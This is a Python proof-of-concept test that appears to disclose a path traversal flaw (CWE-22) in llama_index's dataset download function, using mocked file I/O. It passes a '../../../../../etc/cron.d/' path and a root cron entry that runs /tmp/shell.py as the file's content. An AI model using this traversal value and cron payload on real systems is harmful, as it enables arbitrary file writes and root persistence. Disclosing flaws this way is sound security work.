import os
from pathlib import Path
from unittest.mock import patch, MagicMock
from llama_index.core.download.dataset import download_dataset_and_source_files

def test_the_architectural_flaw():
    # We don't even need a real sandbox because we're proving the LOGIC is broken
    base_dir = "/app/safe_zone"
    
    # Payload: Trying to hit the host's cron jobs
    malicious_dir = "../../../../../etc/cron.d/"
    malicious_file = "payload"

    print("[*] ANALYZING SYSTEMIC TRUST GAP...")

    # We mock the IO calls to see what the library INTENDS to do
    with patch("llama_index.core.download.dataset.get_file_content") as mock_get_content, \
         patch("os.makedirs") as mock_make, \
         patch("builtins.open", create=True) as mock_open:
        
        mock_get_content.return_value = ("* * * * * root /usr/bin/python3 /tmp/shell.py", None)
        mock_make.return_value = None # Force the directory creation to "succeed" in the eyes of the library

        print("[!] Triggering download_dataset_and_source_files...")
        
        download_dataset_and_source_files(
            local_dir_path=base_dir,
            remote_lfs_dir_path="http://ignored",
            source_files_dir_path=malicious_dir,
            dataset_id="exploited_id",
            dataset_class_name="LabelledRagDataset",
            source_files=[malicious_file],
            override_path=True
        )

        if mock_open.called:
            # THIS IS THE PROOF
            final_path = str(mock_open.call_args[0][0])
            print(f"\n[!!!] ARCHITECTURAL BYPASS CONFIRMED [!!!]")
            print(f"The library attempted to write to: {final_path}")
            print(f"Logic: It combined '{base_dir}' + '{malicious_dir}' + '{malicious_file}' without validation.")
            print("\nVERDICT: SYSTEMIC CWE-22 (Path Traversal)")
        else:
            print("\n[-] Library logic failed to reach the open call.")

if __name__ == "__main__":
    test_the_architectural_flaw()
